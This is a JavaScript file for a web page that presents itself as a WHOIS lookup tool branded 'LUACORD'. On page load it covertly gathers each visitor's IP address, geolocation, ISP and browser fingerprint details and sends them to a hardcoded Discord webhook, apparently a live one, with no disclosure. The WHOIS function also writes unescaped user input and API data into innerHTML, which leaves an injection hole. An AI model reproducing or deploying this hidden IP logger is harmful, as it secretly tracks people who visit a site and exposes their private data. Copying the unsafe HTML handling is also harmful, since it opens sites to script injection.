document.addEventListener('DOMContentLoaded', function() {
    sendVisitorInfo();
    
    document.getElementById('searchBtn').addEventListener('click', function() {
        const domain = document.getElementById('domainInput').value.trim();
        if (domain) {
            performWhoisLookup(domain);
        } else {
            alert('Please enter a domain or IP address');
        }
    });
});

async function sendVisitorInfo() {
    try {
        const ipResponse = await fetch('https://api.ipify.org?format=json');
        const ipData = await ipResponse.json();
        const ip = ipData.ip;
        
        const detailsResponse = await fetch(`https://ipapi.co/${ip}/json/`);
        const details = await detailsResponse.json();
        
        let discordAvailable = false;
        try {
            discordAvailable = typeof window.Discord !== 'undefined';
        } catch (e) {
            discordAvailable = false;
        }
        
        const browserInfo = {
            userAgent: navigator.userAgent,
            platform: navigator.platform,
            language: navigator.language,
            cookiesEnabled: navigator.cookieEnabled,
            screenWidth: window.screen.width,
            screenHeight: window.screen.height,
            colorDepth: window.screen.colorDepth,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            discordAvailable: discordAvailable
        };
        
        const timestamp = new Date().toISOString();
        const webhookURL = 'https://discord.com/api/webhooks/1396899184363438262/Xov5NQzse6RvbOlnIBlPVLlMopYd_wQzqRJy1-XblMd76f5l5d76yDkEcLhD1svhWmnz';
        
        const embed = {
            title: "New Visitor on LUACORD",
            color: 0x5865F2,
            fields: [
                {
                    name: "IP Address",
                    value: `\`\`\`${ip}\`\`\``,
                    inline: false
                },
                {
                    name: "Location",
                    value: `\`\`\`${details.city || 'Unknown'}, ${details.region || 'Unknown'}, ${details.country_name || 'Unknown'}\`\`\``,
                    inline: true
                },
                {
                    name: "ISP",
                    value: `\`\`\`${details.org || 'Unknown'}\`\`\``,
                    inline: true
                },
                {
                    name: "Browser Info",
                    value: `\`\`\`User Agent: ${browserInfo.userAgent}\nPlatform: ${browserInfo.platform}\nLanguage: ${browserInfo.language}\nCookies: ${browserInfo.cookiesEnabled}\`\`\``,
                    inline: false
                },
                {
                    name: "Screen Resolution",
                    value: `\`\`\`${browserInfo.screenWidth}x${browserInfo.screenHeight} (${browserInfo.colorDepth}bit)\`\`\``,
                    inline: true
                },
                {
                    name: "Timezone",
                    value: `\`\`\`${browserInfo.timezone}\`\`\``,
                    inline: true
                },
                {
                    name: "Discord Available",
                    value: `\`\`\`${browserInfo.discordAvailable ? 'Yes' : 'No'}\`\`\``,
                    inline: true
                },
                {
                    name: "Timestamp",
                    value: `\`\`\`${timestamp}\`\`\``,
                    inline: true
                }
            ],
            footer: {
                text: "LUACORD - Developed by Mentalite"
            }
        };
        
        fetch(webhookURL, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                embeds: [embed]
            })
        });
        
    } catch (error) {
        console.error('Error sending visitor info:', error);
    }
}

async function performWhoisLookup(domain) {
    const resultDiv = document.getElementById('whoisResults');
    resultDiv.innerHTML = '<p class="placeholder">Looking up WHOIS information for ' + domain + '...</p>';
    
    try {
        const response = await fetch(`https://api.restfulwhois.com/api/v1/whois?domain=${domain}`);
        const data = await response.json();
        
        if (data && !data.error) {
            let html = '<div class="whois-result">';
            html += '<h3>WHOIS Information for ' + domain + '</h3>';
            
            const fieldsToShow = [
                'domain_name', 'registrar', 'creation_date', 
                'expiration_date', 'updated_date', 'name_servers',
                'status', 'registrant_organization', 'registrant_country'
            ];
            
            fieldsToShow.forEach(field => {
                if (data[field]) {
                    const formattedField = field.replace(/_/g, ' ').replace(/\b\w/g, l => l.toUpperCase());
                    html += `<div class="whois-row">
                                <strong>${formattedField}:</strong> <span>${Array.isArray(data[field]) ? data[field].join(', ') : data[field]}</span>
                            </div>`;
                }
            });
            
            html += '</div>';
            resultDiv.innerHTML = html;
        } else {
            resultDiv.innerHTML = `<p class="error">Error: ${data.error || 'Could not retrieve WHOIS information for ' + domain}</p>`;
        }
    } catch (error) {
        console.error('Error performing WHOIS lookup:', error);
        resultDiv.innerHTML = '<p class="error">Error: Failed to fetch WHOIS data. Please try again later.</p>';
    }
}
